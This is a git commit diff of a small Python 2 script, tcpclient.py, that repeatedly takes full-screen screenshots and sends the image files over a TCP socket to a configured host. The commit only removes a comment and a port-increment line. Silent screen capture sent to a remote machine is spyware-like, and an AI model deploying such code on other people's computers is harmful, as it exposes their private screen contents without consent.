0a8310dd32e1b54c63d469e54886ab44c1f38464
MONICA-PALLA <monika.palla@gmail.com>
2016-06-11 18:03:57 +0530

    Update tcpclient.py

--- tcpclient.py
+++ tcpclient.py
@@ -11,7 +11,6 @@ sock.connect((HOST,PORT))# connecting a socket
 
 s1 = "hk"
 for i in range(5):
-    #sock.connect((HOST,PORT))# connecting a socket
     s2 = s1 + str(i)    
     im = ImageGrab.grab()
     im.save("%s.png" %s2)
@@ -26,6 +25,6 @@ for i in range(5):
             sock.send(l)
             break
     print "Done Sending"
-    PORT = PORT + 1
+    
 
 sock.close()
